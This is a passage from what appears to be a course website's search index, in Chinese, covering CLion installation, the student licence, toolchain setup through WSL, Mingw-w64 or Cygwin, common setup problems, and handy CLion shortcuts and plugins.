22\u3002 \u5728\u8fd9\u91cc\u4f60\u53ef\u80fd\u4f1a\u9047\u5230\u5176\u5b83\u95ee\u9898\uff0c\u4f60\u53ef\u4ee5\u5c1d\u8bd5\u5728\u4e92\u8054\u7f51\u4e0a\u641c\u7d22\uff08Google is always your good friend.\uff09\uff0c\u6216\u8005\u5728JetBrains IDE Support\u4e2d\u5bfb\u6c42\u5e2e\u52a9\u3002\u4f60\u53ef\u4ee5\u628a\u6709\u4ef7\u503c\u7684\u95ee\u9898\u7684\u8be6\u7ec6\u60c5\u51b5\u5728\u8bc4\u8bba\u533a\u4e2d\u544a\u8bc9\u6211\uff0c\u6211\u5c06\u5728\u8fd9\u91cc\u8865\u5145\u3002 Mingw-w64 \u5982\u679c\u51fa\u4e8e\u67d0\u4e9b\u539f\u56e0\u4f60\u4e0d\u80fd\u4f7f\u7528WSL\uff0c\u4f60\u53ef\u4ee5\u5c1d\u8bd5 Mingw-w64 \u3002\u6ce8\u610f\uff0c\u6211\u8bf4\u7684\u5e76\u4e0d\u662f MinGW \uff0c\u867d\u7136\u5b83\u662f\u88ab\u652f\u6301\u7684\u3002\u5982\u679c\u4f60\u597d\u5947\u5b83\u4eec\u7684\u533a\u522b\u8bf7\u8bb0\u5f97\u7528\u641c\u7d22\u5f15\u64ce\u627e\u5230\u7b54\u6848\u3002 \u5982\u679c\u4f7f\u7528\u5728\u7ebf\u5b89\u88c5\uff0c\u5e76\u4e14\u6ca1\u6709\u53d8\u66f4\u9ed8\u8ba4\u8def\u5f84\uff0c\u90a3\u4e48\u4f60\u76f4\u63a5\u56de\u5230CLion\u7684Toolchain\u914d\u7f6e\u9875\u9762\u9009\u62e9MinGW\u53ef\u80fd\u53ef\u4ee5\u76f4\u63a5\u68c0\u6d4b\u5230\uff0c\u5982\u679c\u4e0d\u80fd\u6216\u8005\u4f60\u4e0b\u8f7d\u540e\u81ea\u884c\u89e3\u538b\u5230\u4e86\u5176\u4ed6\u4f4d\u7f6e\uff0c\u4f60\u53ea\u9700\u8981\u5728\u914d\u7f6e\u9875\u9762\u4e2d\u6307\u5b9a\u76f8\u5e94\u7684\u8def\u5f84\u5373\u53ef\u3002 Cygwin \u5177\u4f53\u7684\u65b9\u6cd5\u8bf7\u770b \u8fd9\u91cc \u3002 \u5e38\u89c1\u95ee\u9898 \u6211\u5df2\u7ecf\u5b89\u88c5\u597d\u4e86\uff0c\u4e3a\u4ec0\u4e48Toolchain\u8bbe\u7f6e\u9875\u9762\u4e2d\u8fd8\u662f\u6709\u9519\u8bef\uff1f \u4f60\u662f\u5426\u786e\u8ba4\u5df2\u7ecf\u5b89\u88c5\u597d\u4e86 make \u3001 gcc-core \u3001 gcc-g++ \u548c gdb \uff1f","title":"JetBrains CLion \u5b89\u88c5\u4e0e\u914d\u7f6e"},{"location":"szu_courses/cpp/clion_conf/#_1","text":"\u5b66\u751f\u53ef\u4ee5\u83b7\u53d6\u5230\u514d\u8d39\u7684\u6559\u80b2\u7248\uff0c\u5f53\u7136\uff0c\u4e0d\u80fd\u7528\u4e8e\u5546\u4e1a\u7528\u9014\u3002\u76ee\u524d\uff0c\u4f60\u53ef\u4ee5\u5728JetBrains\u5b98\u65b9\u7f51\u7ad9\u7684\u9996\u9875\u4e0a\u65b9\u5bfc\u822a\u680f\u4e2d\u7684Support\u627e\u5230Education\uff0c\u4f60\u4f1a\u770b\u5230APPLY FOR FREE STUDENT PACK\uff1a \u63d0\u4f9b\u4f60\u7684\u5b66\u751f\u90ae\u7bb1\u5e76\u5b8c\u6210\u7533\u8bf7\uff0c\u4f60\u5c06\u4f1a\u5f97\u52301\u5e74\u7684\u6559\u80b2\u7248\u6388\u6743\u3002\u53ea\u8981\u4f60\u6301\u7eed\u6301\u6709\u5b66\u751f\u90ae\u7bb1\uff0c\u6bcf\u5e74\u5728\u8be5\u8bb8\u53ef\u8bc1\u8fc7\u671f\u524d\u4f60\u90fd\u4f1a\u6536\u5230\u7eed\u671f\u63d0\u9192\u90ae\u4ef6\uff0c\u70b9\u51fb\u8be5\u90ae\u4ef6\u4e2d\u7684\u7eed\u671f\u5373\u53ef\u5b8c\u6210\uff0c\u6b63\u5e38\u60c5\u51b5\u4e0b\u4e0d\u9700\u8981\u989d\u5916\u64cd\u4f5c\u3002 How can I renew my free educational license for another year? If you're still studying/teaching at a full-time educational program, you can renew your free license for another year. To do so, use the dedicated link in your JetBrains account, or use a link from the automatic email reminder we send out one week before your subscription expires. \u5982\u679c\u4f60\u53ea\u6253\u7b97\u4f7f\u7528JetBrains\u5bb6\u7684CLion\uff0c\u5e76\u4e0d\u6253\u7b97\u4f7f\u7528\u4f8b\u5982\u4e3aJava\u7b49\u51c6\u5907\u7684IntelliJ\u6216\u662f\u4e3aPython\u51c6\u5907\u7684PyCharm\u7b49\u5de5\u5177\uff0c\u90a3\u4e48\u76f4\u63a5\u5355\u72ec\u4e0b\u8f7d\u5e76\u5b89\u88c5CLion\u5373\u53ef\u3002 \u4f46\u5982\u679c\u4f60\u5e0c\u671b\u4f7f\u7528JetBrains\u5bb6\u7684\u591a\u4e2aIDE\uff0c\u90a3\u4e48\u6211\u63a8\u8350\u4f60\u4e0b\u8f7d\u5b89\u88c5JetBrains Toolbox\uff0c\u7136\u540e\u5728Toolbox\u4e2d\u5b89\u88c5\u4f60\u9700\u8981\u7684\u5de5\u5177\u3002\u6709\u5173Toolbox\u7684\u66f4\u591a\u4fe1\u606f\uff0c\u4f60\u53ef\u4ee5\u5728 \u8fd9\u91cc \u627e\u5230\u3002","title":"\u7533\u8bf7\u6559\u80b2\u7248\u6388\u6743"},{"location":"szu_courses/cpp/clion_conf/#toolchain","text":"\u5b89\u88c5\u5b8c\u6210\u540e\uff0c\u7b2c\u4e00\u6b21\u8fd0\u884cCLion\u7684\u65f6\u5019\uff0c\u4f1a\u6709\u5411\u5bfc\u6307\u5f15\u4f60\u5b8c\u6210\u5bf9\u4e3b\u9898\u3001\u5de5\u5177\u94fe\uff08Toolchain\uff09\u7b49\u7684\u914d\u7f6e\u3002\u6211\u80fd\u731c\u5230\u5f88\u591a\u540c\u5b66\u7684\u574f\u4e60\u60ef\u5c31\u662f\u4e00\u8defNext\uff0c\u7136\u540e\u8fdb\u5165\u4e86\u4e3b\u754c\u9762\uff0c\u627e\u5230Run\u5c31\u60f3\u5f00\u59cb\u8dd1\u7a0b\u5e8f\uff0c\u7136\u540e\u5c31\u53d1\u73b0\u6839\u672c\u4e0d\u80fd\u7528\uff0c\u5230\u5904\u4e71\u70b9\u534a\u5929\u53d1\u73b0\u89e3\u51b3\u4e0d\u4e86\u4e8e\u662f\u542f\u52a8\u4e86\u5378\u8f7d\u7a0b\u5e8f\u3002\uff08\u644a\u624b.jpg\uff09IDE\u672c\u8eab\u5e76\u6ca1\u6709\u96c6\u6210\u7f16\u8bd1\u5668\uff0c\u4f60\u9700\u8981\u5b89\u88c5\u4e00\u4e2aIDE\u652f\u6301\u7684\u7f16\u8bd1\u5668\uff0c\u7136\u540e\u544a\u8bc9IDE\u8fd9\u4e2a\u7f16\u8bd1\u5668\u7684\u4f4d\u7f6e\u5728\u54ea\u91cc\u624d\u80fd\u8ba9\u5b83\u8c03\u7528\u3002 \u63a5\u4e0b\u6765\u7684\u5185\u5bb9\u4e3b\u8981\u662f\u9488\u5bf9Windows\u5e73\u53f0\u8bf4\u660e\u7684\uff1a","title":"\u914d\u7f6eToolchain"},{"location":"szu_courses/cpp/clion_conf/#windows-subsystem-for-linux-wsl-on-windows-10-linuxwindows","text":"\u76ee\u524d\uff0c\u8fd9\u662fWindows 10\u6216\u8005Windows Server 2019\u4e0a\u7684\u529f\u80fd\u3002\u66f4\u591a\u4fe1\u606f\u4f60\u53ef\u4ee5\u5728 \u8fd9\u91cc \u627e\u5230\u3002 \u5177\u4f53\u7684\u914d\u7f6e\u65b9\u6cd5\u4f60\u53ef\u4ee5\u770b\u5b98\u65b9\u7684\u6587\u6863\uff1a WSL - Help | CLion - JetBrains \u3002 \u8fd9\u53ef\u80fd\u662f\u5f53\u524d\u5728Windows\u4e0a\u8f83\u597d\u7684\u89e3\u51b3\u65b9\u6848\uff0c\u6709\u76f8\u5bf9\u8f83\u9ad8\u7684\u7f16\u8bd1\u901f\u5ea6\u3001\u63d0\u793a\u901f\u5ea6\uff0c\u5e76\u4e14\u66f4\u91cd\u8981\u7684\u662fIDE\u96c6\u6210\u7684\u63a7\u5236\u53f0\u4e0a\u8f93\u5165\u8f93\u51fa\u90fd\u662f\u6bd4\u8f83\u6b63\u5e38\u7684\uff08\u5982\u679c\u4f60\u4f7f\u7528\u8fc7MinGW\u4f5c\u4e3a\u5de5\u5177\u94fe\u4e00\u6bb5\u65f6\u95f4\u7684\u8bdd\u5c31\u4f1a\u6709\u8fd9\u79cd\u611f\u53d7\uff09\u3002","title":"\uff08\u63a8\u8350\uff09 Windows Subsystem for Linux (WSL) on Windows 10 \u9002\u7528\u4e8eLinux\u7684Windows\u5b50\u7cfb\u7edf"},{"location":"szu_courses/cpp/clion_conf/#_2","text":"\u6211\u5df2\u7ecf\u5728\u5e94\u7528\u5546\u5e97\u91cc\u4e0b\u8f7d\u4e86Ubuntu\uff0c\u4f46\u662f\u4e3a\u4ec0\u4e48\u6253\u5f00Ubuntu\u540e\u4e0d\u80fd\u7528\uff1f\u5b83\u63d0\u793a\uff1aThe Windows Subsystem for Linux optional component is not enabled. Please enable it and try again. \u8fd9\u4e2a...\u4eba\u5bb6\u8bf4\u5f97\u5f88\u660e\u767d\u4e86\u3002\u4f60\u6ca1\u6709\u5728Windows\u4e2d\u542f\u7528WSL\u529f\u80fd\uff0c\u4f60\u5e94\u8be5\u5728 \u542f\u7528\u6216\u5173\u95edWindows\u529f\u80fd \u4e2d\u6253\u5f00\u5b83\u3002\u5982\u679c\u4f60\u627e\u4e0d\u5230\u5b83\u7684\u8bdd...\u5b83\u5177\u4f53\u5728 \u63a7\u5236\u9762\u677f->\u7a0b\u5e8f->\u542f\u7528\u6216\u5173\u95edWindows\u529f\u80fd->\u9002\u7528\u4e8eLinux\u7684Windows\u5b50\u7cfb\u7edf \u91cc\u3002\u4ec0\u4e48\uff1f\u4f60\u8bf4\u4f60\u4e0d\u77e5\u9053Windows\u7684\u63a7\u5236\u9762\u677f\u5728\u54ea\u91cc\uff1f\u6211\u60f3\u4f60\u5e94\u8be5\u5148\u5b66\u4f1a\u5982\u4f55\u4f7f\u7528\u641c\u7d22\u5f15\u64ce\u3002 \u6211\u5df2\u7ecf\u6309\u7167\u4e0a\u9762\u7684\u7b54\u6848\u542f\u7528\u4e86WSL\u529f\u80fd\uff0c\u4f46\u662f\u518d\u6b21\u6253\u5f00Ubuntu\u8fd8\u662f\u6ca1\u6709\u53d8\u5316\uff1f \u4f60\u91cd\u542f\u4e86\u5417\uff1f Ubuntu\u662f\u88c5\u597d\u4e86\uff0c\u4f46\u662f\u6211\u8fd8\u662f\u4e0d\u80fd\u4f7f\u7528CLion\uff0c\u6253\u5f00Toolchain\u8bbe\u7f6e\u540e\uff0c\u6709\u5f88\u591a\u7ea2\u8272\u7684\u9519\u8bef\uff0c\u6bd4\u5982\uff1aCannot establish connection\u3002 \u4f60\u662f\u5426\u5df2\u7ecf\u6309\u7167\u4e0a\u8ff0\u5b98\u65b9\u6587\u6863\u4e2d\u6240\u8981\u6c42\u7684\u5185\u5bb9\u8fdb\u884c\u4e86\u76f8\u5e94\u7684\u64cd\u4f5c\uff1f\u5f53\u4f60\u6267\u884c sudo apt install cmake gcc gdb \u524d\u4f60\u53ef\u80fd\u9700\u8981\u5148\u6267\u884c sudo apt update \u548c sudo apt upgrade \u3002\u8fd8\u6709\u4e00\u4e2a\u95ee\u9898\u662f\uff1a\u6211\u53d1\u73b0\u6709\u540c\u5b66\u6267\u884c\u4e86\u5b89\u88c5\u547d\u4ee4\u540e\u6ca1\u6709\u6ce8\u610f\u5230\u6210\u529f\u4e0e\u5426\u5c31\u7ee7\u7eed\u4e0b\u4e00\u6b65\uff0c\u8fd9\u53ef\u80fd\u4f1a\u5bf9\u540e\u7eed\u5e26\u6765\u4e00\u4e9b\u9519\u8bef\uff0c\u5982\u679c\u4f60\u6240\u5728\u7684\u7f51\u7edc\u73af\u5883\u8f83\u4e3a\u6076\u52a3\uff0c\u90a3\u4e48\u4f60\u53ef\u80fd\u9700\u8981\u4f7f\u7528\u4ee3\u7406\u3002\u6b64\u5916\uff0c\u5982\u679c\u4f60\u4f7f\u7528\u4e86\u5b98\u65b9\u6587\u6863\u4e2d\u7684\u5b89\u88c5\u811a\u672c\uff0c\u4f60\u7684SSH\u7aef\u53e3\u53f7\u53ef\u80fd\u662f2222\u3002 \u5728\u8fd9\u91cc\u4f60\u53ef\u80fd\u4f1a\u9047\u5230\u5176\u5b83\u95ee\u9898\uff0c\u4f60\u53ef\u4ee5\u5c1d\u8bd5\u5728\u4e92\u8054\u7f51\u4e0a\u641c\u7d22\uff08Google is always your good friend.\uff09\uff0c\u6216\u8005\u5728JetBrains IDE Support\u4e2d\u5bfb\u6c42\u5e2e\u52a9\u3002\u4f60\u53ef\u4ee5\u628a\u6709\u4ef7\u503c\u7684\u95ee\u9898\u7684\u8be6\u7ec6\u60c5\u51b5\u5728\u8bc4\u8bba\u533a\u4e2d\u544a\u8bc9\u6211\uff0c\u6211\u5c06\u5728\u8fd9\u91cc\u8865\u5145\u3002","title":"\u5e38\u89c1\u95ee\u9898"},{"location":"szu_courses/cpp/clion_conf/#mingw-w64","text":"\u5982\u679c\u51fa\u4e8e\u67d0\u4e9b\u539f\u56e0\u4f60\u4e0d\u80fd\u4f7f\u7528WSL\uff0c\u4f60\u53ef\u4ee5\u5c1d\u8bd5 Mingw-w64 \u3002\u6ce8\u610f\uff0c\u6211\u8bf4\u7684\u5e76\u4e0d\u662f MinGW \uff0c\u867d\u7136\u5b83\u662f\u88ab\u652f\u6301\u7684\u3002\u5982\u679c\u4f60\u597d\u5947\u5b83\u4eec\u7684\u533a\u522b\u8bf7\u8bb0\u5f97\u7528\u641c\u7d22\u5f15\u64ce\u627e\u5230\u7b54\u6848\u3002 \u5982\u679c\u4f7f\u7528\u5728\u7ebf\u5b89\u88c5\uff0c\u5e76\u4e14\u6ca1\u6709\u53d8\u66f4\u9ed8\u8ba4\u8def\u5f84\uff0c\u90a3\u4e48\u4f60\u76f4\u63a5\u56de\u5230CLion\u7684Toolchain\u914d\u7f6e\u9875\u9762\u9009\u62e9MinGW\u53ef\u80fd\u53ef\u4ee5\u76f4\u63a5\u68c0\u6d4b\u5230\uff0c\u5982\u679c\u4e0d\u80fd\u6216\u8005\u4f60\u4e0b\u8f7d\u540e\u81ea\u884c\u89e3\u538b\u5230\u4e86\u5176\u4ed6\u4f4d\u7f6e\uff0c\u4f60\u53ea\u9700\u8981\u5728\u914d\u7f6e\u9875\u9762\u4e2d\u6307\u5b9a\u76f8\u5e94\u7684\u8def\u5f84\u5373\u53ef\u3002","title":"Mingw-w64"},{"location":"szu_courses/cpp/clion_conf/#cygwin","text":"\u5177\u4f53\u7684\u65b9\u6cd5\u8bf7\u770b \u8fd9\u91cc \u3002","title":"Cygwin"},{"location":"szu_courses/cpp/clion_conf/#_3","text":"\u6211\u5df2\u7ecf\u5b89\u88c5\u597d\u4e86\uff0c\u4e3a\u4ec0\u4e48Toolchain\u8bbe\u7f6e\u9875\u9762\u4e2d\u8fd8\u662f\u6709\u9519\u8bef\uff1f \u4f60\u662f\u5426\u786e\u8ba4\u5df2\u7ecf\u5b89\u88c5\u597d\u4e86 make \u3001 gcc-core \u3001 gcc-g++ \u548c gdb \uff1f","title":"\u5e38\u89c1\u95ee\u9898"},{"location":"szu_courses/cpp/clion_hotkeys/","text":"\u60f3\u60f3\u53ef\u80fd\u5927\u90e8\u5206\u540c\u5b66\u61d2\u5f97\u770b Tip of the Day \uff0c\u51b3\u5b9a\u8fd8\u662f\u5728\u8fd9\u91cc\u7a0d\u5fae\u5199\u4e00\u70b9\u597d\u4e86\u3002\u6700\u65e9\u662f\u56e0\u4e3a\u6709\u4eba\u8ddf\u6211\u8bf4CLion\u6ca1\u6709Dev-Cpp\u597d\u7528\uff0c\u4e8e\u662f\u4e4e\u6211\u5c1d\u8bd5\u7740\u5728\u670b\u53cb\u5708\u6bcf\u5929\u7ffb\u8bd1\u4e00\u70b9\u6bd4\u8f83\u5e38\u7528\u7684\u529f\u80fd\uff0c\u4f46\u662f\u540e\u9762\u53d1\u73b0\u6536\u6548\u751a\u5fae\uff0c\u800c\u4e14\u4e5f\u5f88\u4e0d\u65b9\u4fbf\u67e5\u9605\u3002\u73b0\u5728\u53ef\u80fd\u4f1a\u6162\u6162\u5728\u8fd9\u91cc\u6574\u7406\u4e00\u4e9b\u6bd4\u8f83\u9002\u5408\u65b0\u624b\u7684\u5185\u5bb9\uff0c\u5404\u4f4d\u8001\u9e1f\u53ef\u4ee5\u65e0\u89c6\u4e86\u3002 Edit \u7f16\u8f91 Complete Current Statement \u5b8c\u6210\u8bed\u53e5 \u4f60\u53ef\u4ee5\u4f7f\u7528 Ctrl+Shift+Enter \u6765\u5b8c\u6210\u4f8b\u5982if\u3001do-while\u3001try-while\u548creturn\u7b49\u8bed\u53e5\u3002\u4f8b\u5982\u4e3aif\u3001while\u8bed\u53e5\u6dfb\u52a0\u82b1\u62ec\u53f7\u3002 Copy \u590d\u5236 || Cut \u526a\u5207 || Paste \u7c98\u8d34 \u6211\u60f3\u4f60\u5e94\u8be5\u77e5\u9053\u5b83\u4eec\u7684\u5feb\u6377\u952e\u5206\u522b\u662f Ctrl+C \u3001 Ctrl+X \u548c Ctrl+V \u3002\u4f60\u53ef\u4ee5\u5148\u9009\u4e2d\u4e00\u6bb5\u4ee3\u7801\uff08\u6211\u60f3\u4f60\u5e94\u8be5\u8981\u77e5\u9053\u9009\u4e2d\u4e00\u6bb5\u6587\u5b57\u5e76\u4e0d\u9700\u8981\u9f20\u6807\uff0c\u53ea\u9700\u8981\u6309\u4f4fShift\u7136\u540e\u4f7f\u7528\u65b9\u5411\u952e\u5373\u53ef\uff09\uff0c\u7136\u540e\u5bf9\u8fd9\u6bb5\u4ee3\u7801\u5e94\u7528\u4e0a\u8ff0\u5feb\u6377\u952e\u3002\u5f53\u4f60\u4e0d\u9009\u4e2d\u65f6\uff0c\u4f60\u53ef\u4ee5\u590d\u5236\u6216\u8005\u526a\u5207 \u6574\u884c \u3002\u5982\u679c\u4f60\u60f3\u91cd\u590d\u67d0\u4e00\u884c\uff0c\u4e0d\u5fc5\u590d\u5236\u518d\u7c98\u8d34\uff0c\u4f60\u53ef\u4ee5\u4f7f\u7528 Ctrl+D \u3002 Code \u4ee3\u7801 Comment with Line/Block Comment \u884c\u6ce8\u91ca/\u53d6\u6d88\u884c\u6ce8\u91ca || \u5757\u6ce8\u91ca/\u53d6\u6d88\u5757\u6ce8\u91ca \u4f60\u53ef\u4ee5\u4f7f\u7528 Ctrl+/ \u6765\u5bf9\u67d0\u884c\u6216\u4e00\u6bb5\u6dfb\u52a0\u6216\u53d6\u6d88\u884c\u6ce8\u91ca\uff0c Ctrl+Shift+/ \u5219\u4e3a\u5757\u6ce8\u91ca\u3002 Reformat Code \u91cd\u65b0\u683c\u5f0f\u5316\u4ee3\u7801 \u521a\u5165\u95e8\u7684\u4f60\u53ef\u80fd\u5f88\u9700\u8981\u8fd9\u4e2a\u529f\u80fd\uff0c\u4f7f\u7528 Ctrl+Alt+L \u6765\u683c\u5f0f\u5316\u4f60\u7684\u4ee3\u7801\u3002 Surround With \u56f4\u7ed5... \u9009\u4e2d\u4e00\u6bb5\u4ee3\u7801\u540e\uff0c\u5bf9\u5b83\u4f7f\u7528 Ctrl+Alt+T \u4f7f\u5b83\u88ab\u4f8b\u5982if\u8bed\u53e5\u56f4\u7ed5\u3002 Refactor \u91cd\u6784 Rename \u91cd\u547d\u540d \u4f60\u53ef\u4ee5\u4f7f\u7528 Shift+F6 \u8fdb\u884c\u91cd\u547d\u540d\uff0c\u4f8b\u5982\u4e00\u6b21\u6027\u66f4\u6539\u4f5c\u7528\u57df\u5185\u7684\u53d8\u91cf\u540d\u3002 Show Intention Actions \u663e\u793a\u610f\u5411\u884c\u52a8\u548c\u5feb\u901f\u4fee\u590d \u4f60\u53ef\u4ee5\u4f7f\u7528 Alt+Enter \u6765\u6267\u884c\u4e00\u4e9b\u64cd\u4f5c\uff0c\u7279\u522b\u662f\u4ee3\u7801\u65c1\u663e\u793a\u7ea2\u8272\u706f\u6ce1\u7684\u65f6\u5019\u3002 Search Everywhere || Run Anything \u627e\u4e0d\u5230\u67d0\u4e2a\u529f\u80fd\uff1f\u8bd5\u8bd5\u76f4\u63a5\u641c\u7d22\u5427\uff1a Double Shift \u53ef\u4ee5Search Everywhere\u3002\u6bd4\u5982\u8bbe\u7f6e\uff08Settings\uff09\u3001\u63d2\u4ef6\uff08Plugins\uff09\u3001\u5de5\u5177\u94fe\uff08Toolchains\uff09\u7b49\u7b49\u4f60\u60f3\u8981\u7684\u4e1c\u897f\u3002\u4ece2018.3\u7248\u5f00\u59cb\uff0c\u4f60\u53ef\u4ee5 Double Ctrl \u6765Run Anything\u3002 Plugins \u63d2\u4ef6 \u6709\u4e30\u5bcc\u7684\u63d2\u4ef6\u53ef\u4f9b\u4f60\u9009\u62e9\u5e76\u4f7f\u7528\u3002\u4f60\u53ef\u4ee5\u4eceFile->Settings\uff08Ctrl+Alt+S\uff09\u4e2d\u627e\u5230 Plugins \uff0c\u4e0d\u8fc7\u6211\u66f4\u559c\u6b22\u76f4\u63a5 \u4e24\u4e0bShift \u4f7f\u7528 Search Everywhere \uff0c\u7136\u540e\u8f93\u5165plugins\u76f4\u63a5\u627e\u5230\u5e76\u8fdb\u5165\u3002 CodeGlance \u60f3\u8981\u5728\u6eda\u52a8\u6761\u65c1\u6709\u50cfVisual Studio Code\u6216Sublime Text\u90a3\u6837\u7684\u4ee3\u7801\u7f29\u7565\uff1f\u5b89\u88c5\u5373\u53ef\u62e5\u6709\u3002 Material Theme UI \u53ef\u4ee5\u6539\u53d8\u4e3b\u9898\u6837\u5f0f\u3002 Presentation Assistant \u61c2\u7684\u4eba\u81ea\u7136\u61c2\u7684...\u4e0d\u89e3\u91ca\u4e86","title":"\u4e00\u4e9b\u4f7f\u7528CLion\u7684\u6280\u5de7"},{"location":"szu_courses/cpp/clion_hotkeys/#edit","text":"","title":"Edit \u7f16\u8f91"},{"location":"szu_courses/cpp/clion_hotkeys/#complete-current-statement","text":"\u4f60\u53ef\u4ee5\u4f7f\u7528 Ctrl+Shift+Enter \u6765\u5b8c\u6210\u4f8b\u5982if\u3001do-while\u3001try-while\u548creturn\u7b49\u8bed\u53e5\u3002\u4f8b\u5982\u4e3aif\u3001while\u8bed\u53e5\u6dfb\u52a0\u82b1\u62ec\u53f7\u3002","title":"Complete Current Statement \u5b8c\u6210\u8bed\u53e5"},{"location":"szu_courses/cpp/clion_hotkeys/#copy-cut-paste","text":"\u6211\u60f3\u4f60\u5e94\u8be5\u77e5\u9053\u5b83\u4eec\u7684\u5feb\u6377\u952e\u5206\u522b\u662f Ctrl+C \u3001 Ctrl+X \u548c Ctrl+V \u3002\u4f60\u53ef\u4ee5\u5148\u9009\u4e2d\u4e00\u6bb5\u4ee3\u7801\uff08\u6211\u60f3\u4f60\u5e94\u8be5\u8981\u77e5\u9053\u9009\u4e2d\u4e00\u6bb5\u6587\u5b57\u5e76\u4e0d\u9700\u8981\u9f20\u6807\uff0c\u53ea\u9700\u8981\u6309\u4f4fShift\u7136\u540e\u4f7f\u7528\u65b9\u5411\u952e\u5373\u53ef\uff09\uff0c\u7136\u540e\u5bf9\u8fd9\u6bb5\u4ee3\u7801\u5e94\u7528\u4e0a\u8ff0\u5feb\u6377\u952e\u3002\u5f53\u4f60\u4e0d\u9009\u4e2d\u65f6\uff0c\u4f60\u53ef\u4ee5\u590d\u5236\u6216\u8005\u526a\u5207 \u6574\u884c \u3002\u5982\u679c\u4f60\u60f3\u91cd\u590d\u67d0\u4e00\u884c\uff0c\u4e0d\u5fc5\u590d\u5236\u518d\u7c98\u8d34\uff0c\u4f60\u53ef\u4ee5\u4f7f\u7528 Ctrl+D \u3002","title":"Copy \u590d\u5236 || Cut \u526a\u5207 || Paste \u7c98\u8d34"},{"location":"szu_courses/cpp/clion_hotkeys/#code","text":"","title":"Code \u4ee3\u7801"},{"location":"szu_courses/cpp/clion_hotkeys/#comment-with-lineblock-comment","text":"\u4f60\u53ef\u4ee5\u4f7f\u7528 Ctrl+/ \u6765\u5bf9\u67d0\u884c\u6216\u4e00\u6bb5\u6dfb\u52a0\u6216\u53d6\u6d88\u884c\u6ce8\u91ca\uff0c Ctrl+Shift+/ \u5219\u4e3a\u5757\u6ce8\u91ca\u3002","title":"Comment with Line/Block Comment \u884c\u6ce8\u91ca/\u53d6\u6d88\u884c\u6ce8\u91ca || \u5757\u6ce8\u91ca/\u53d6\u6d88\u5757\u6ce8\u91ca"},{"location":"szu_courses/cpp/clion_hotkeys/#reformat-code","text":"\u521a\u5165\u95e8\u7684\u4f60\u53ef\u80fd\u5f88\u9700\u8981\u8fd9\u4e2a\u529f\u80fd\uff0c\u4f7f\u7528 Ctrl+Alt+L \u6765\u683c\u5f0f\u5316\u4f60\u7684\u4ee3\u7801\u3002","title":"Reformat Code \u91cd\u65b0\u683c\u5f0f\u5316\u4ee3\u7801"},{"location":"szu_courses/cpp/clion_hotkeys/#surround-with","text":"\u9009\u4e2d\u4e00\u6bb5\u4ee3\u7801\u540e\uff0c\u5bf9\u5b83\u4f7f\u7528 Ctrl+Alt+T \u4f7f\u5b83\u88ab\u4f8b\u5982if\u8bed\u53e5\u56f4\u7ed5\u3002","title":"Surround With \u56f4\u7ed5..."},{"location":"szu_courses/cpp/clion_hotkeys/#refactor","text":"","title":"Refactor \u91cd\u6784"},{"location":"szu_courses/cpp/clion_hotkeys/#rename","text":"\u4f60\u53ef\u4ee5\u4f7f\u7528 Shift+F6 \u8fdb\u884c\u91cd\u547d\u540d\uff0c\u4f8b\u5982\u4e00\u6b21\u6027\u66f4\u6539\u4f5c\u7528\u57df\u5185\u7684\u53d8\u91cf\u540d\u3002","title":"Rename \u91cd\u547d\u540d"},{"location":"szu_courses/cpp/clion_hotkeys/#show-intention-actions","text":"\u4f60\u53ef\u4ee5\u4f7f\u7528 Alt+Enter \u6765\u6267\u884c\u4e00\u4e9b\u64cd\u4f5c\uff0c\u7279\u522b\u662f\u4ee3\u7801\u65c1\u663e\u793a\u7ea2\u8272\u706f\u6ce1\u7684\u65f6\u5019\u3002","title":"Show Intention Actions \u663e\u793a\u610f\u5411\u884c\u52a8\u548c\u5feb\u901f\u4fee\u590d"},{"location":"szu_courses/cpp/clion_hotkeys/#search-everywhere-run-anything","text":"\u627e\u4e0d\u5230\u67d0\u4e2a\u529f\u80fd\uff1f\u8bd5\u8bd5\u76f4\u63a5\u641c\u7d22\u5427\uff1a Double Shift \u53ef\u4ee5Search Everywhere\u3002\u6bd4\u5982\u8bbe\u7f6e\uff08Settings\uff09\u3001\u63d2\u4ef6\uff08Plugins\uff09\u3001\u5de5\u5177\u94fe\uff08Toolchains\uff09\u7b49\u7b49\u4f60\u60f3\u8981\u7684\u4e1c\u897f\u3002\u4ece2018.3\u7248\u5f00\u59cb\uff0c\u4f60\u53ef\u4ee5 Double Ctrl \u6765Run Anything\u3002","title":"Search Everywhere || Run Anything"},{"location":"szu_courses/cpp/clion_hotkeys/#plugins","text":"\u6709\u4e30\u5bcc\u7684\u63d2\u4ef6\u53ef\u4f9b\u4f60\u9009\u62e9\u5e76\u4f7f\u7528\u3002\u4f60\u53ef\u4ee5\u4eceFile->Settings\uff08Ctrl+Alt+S\uff09\u4e2d\u627e\u5230 Plugins \uff0c\u4e0d\u8fc7\u6211\u66f4\u559c\u6b22\u76f4\u63a5 \u4e24\u4e0bShift \u4f7f\u7528 Search Everywhere \uff0c\u7136\u540e\u8f93\u5165plugins\u76f4\u63a5\u627e\u5230\u5e76\u8fdb\u5165\u3002","title":"Plugins \u63d2\u4ef6"},{"location":"szu_courses/cpp/clion_hotkeys/#codeglance","text":"\u60f3\u8981\u5728\u6eda\u52a8\u6761\u65c1\u6709\u50cfVisual Studio Code\u6216Sublime Text\u90a3\u6837\u7684\u4ee3\u7801\u7f29\u7565\uff1f\u5b89\u88c5\u5373\u53ef\u62e5\u6709\u3002","title":"CodeGlance"},{"location":"szu_courses/cpp/clion_hotkeys/#material-theme-ui","text":"\u53ef\u4ee5\u6539\u53d8\u4e3b\u9898\u6837\u5f0f\u3002","title":"Material Theme UI"},{"location":"szu_courses/cpp/clion_hotkeys/#presentation-assistant","text":"\u61c2\u7684\u4eba\u81ea\u7136\u61c2\u7684...\u4e0d\u89e3\u91ca\u4e86","title":"Presentation 